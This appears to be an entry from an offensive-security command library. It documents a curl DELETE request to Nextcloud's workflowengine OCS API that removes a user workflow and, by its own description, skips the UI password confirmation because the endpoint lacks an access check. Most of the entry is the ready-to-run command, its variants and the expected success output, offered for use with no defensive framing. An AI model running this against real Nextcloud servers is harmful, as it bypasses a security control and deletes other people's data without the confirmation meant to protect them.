---
data: >-
  curl -X DELETE
  "https://nextcloud.example.com/ocs/v2.php/apps/workflowengine/api/v1/workflows/user/3?format=json"
  -H "OCS-APIRequest: true" -b "cookie_session=your_session_cookie"
tags:
  - nextcloud
  - api-delete
type: command
output: null
executor: bash
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:29:44.926Z'
id: 2a79e0ff-9b8c-4ed9-af94-81d44416c6ea
verified: false
validated: true
submitted: true
---
# nextcloud-delete-workflow-api

## Command

```bash
curl -X DELETE "https://nextcloud.example.com/ocs/v2.php/apps/workflowengine/api/v1/workflows/user/3?format=json" -H "OCS-APIRequest: true" -b "cookie_session=your_session_cookie"
```

## Description

This command sends a DELETE request to the Nextcloud OCS API to remove a user workflow by ID, bypassing the UI password confirmation due to missing access controls in the endpoint.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X DELETE` | Specifies the HTTP DELETE method | Yes |
| `URL path /user/{id}` | Targets the workflow ID (replace 3 with actual ID) | Yes |
| `?format=json` | Requests JSON response format | Yes |
| `-H "OCS-APIRequest: true"` | Required header for OCS API authentication | Yes |
| `-b "cookie_session=..."` | Passes authenticated session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X DELETE "https://nextcloud.example.com/ocs/v2.php/apps/workflowengine/api/v1/workflows/user/3?format=json" -H "OCS-APIRequest: true" -b "cookie_session=abc123"
```

### Advanced Usage

```bash
curl -X DELETE "https://nextcloud.example.com/ocs/v2.php/apps/workflowengine/api/v1/workflows/user/3?format=json" -H "OCS-APIRequest: true" -H "Content-Type: application/json" -b "cookie_session=abc123" -v
```

## Expected Output

HTTP 200 OK with JSON response: {"ocs":{"meta":{"status":"ok","statuscode":200,"message":"OK"},"data":[]}}. Indicates successful deletion without password prompt.

## Related

- [[procedures/Bypass-Deletion-via-OCS-API]]
